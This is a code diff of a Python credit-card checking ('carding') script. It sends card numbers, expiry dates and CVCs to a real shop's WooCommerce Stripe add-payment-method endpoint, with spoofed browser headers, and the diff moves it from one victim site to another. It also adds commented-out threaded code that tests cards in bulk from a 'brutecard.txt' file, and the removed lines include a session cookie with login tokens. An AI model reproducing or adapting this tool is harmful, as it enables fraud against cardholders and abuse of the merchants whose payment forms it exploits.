@@ -159,18 +166,17 @@ def Tele(ccx):
         'accept': '*/*',
         'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
         'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'origin': 'https://3dprintedprops.com',
+        'origin': 'https://liquidlemn.com',
         'priority': 'u=1, i',
-        'referer': 'https://3dprintedprops.com/my-account/add-payment-method/',
-        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
+        'referer': 'https://liquidlemn.com/my-account/add-payment-method/',
+        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         'x-requested-with': 'XMLHttpRequest',
-        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F136.0.0.0%20Safari%2F537.36; __stripe_mid=a5c7f57a-d956-4d28-8095-c8c7a6944acc53ba43; __stripe_sid=73b25042-9635-4ec3-b0c3-48561d986b456d9887; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7c8fd66723dda58e67a3ffadfab8ca45=noemail-4692%7C1749721214%7CLFM1CvsXMNxTa8MWGwEzgJf6dEAco2lnsnSsV3g1AwD%7C6efb17f4415685ec36e25b7a163654ce36324f91519dc02f7f82188fdc1aa015; sbjs_session=pgs%3D24%7C%7C%7Ccpg%3Dhttps%3A%2F%2F3dprintedprops.com%2Fmy-account%2Fadd-payment-method%2F',
     }
 
     params = {
@@ -181,10 +187,40 @@ def Tele(ccx):
         'action': 'create_and_confirm_setup_intent',
         'wc-stripe-payment-method': pm,
         'wc-stripe-payment-type': 'card',
-        '_ajax_nonce': nonce_match,
+        '_ajax_nonce': ajax_nonce,
     }
 
-    response = requests.post('https://3dprintedprops.com/', params=params, headers=headers, data=data)
-    print(f"{n}|{cvc}|{mm}|{yy}: ",response.text)
-    return response.json()
+    response = requests.post('https://liquidlemn.com/', params=params,headers=headers, data=data)
+    print(f"{n}|{mm}|{yy}|{cvc}: ",response.text)
+    return response.text
 
+# def worker(q):
+#     while not q.empty():
+#         ccx = q.get()
+#         result = Tele(ccx)
+#         with print_lock:
+#             print(f"Card: {ccx.strip()} - Result: {result}")
+#             print("-" * 40)
+#         q.task_done()
+
+# def check_cards_from_file(file_name, num_threads=10):
+#     q = Queue()
+    
+#     # Read cards and put them in the queue
+#     with open(file_name, 'r') as file:
+#         for line in file:
+#             q.put(line.strip())
+    
+#     # Create and start threads
+#     threads = []
+#     for i in range(num_threads):
+#         t = Thread(target=worker, args=(q,))
+#         t.start()
+#         threads.append(t)
+    
+#     # Wait for all threads to complete
+#     for t in threads:
+#         t.join()
+
+# if __name__ == "__main__":
+#     check_cards_from_file('brutecard.txt')
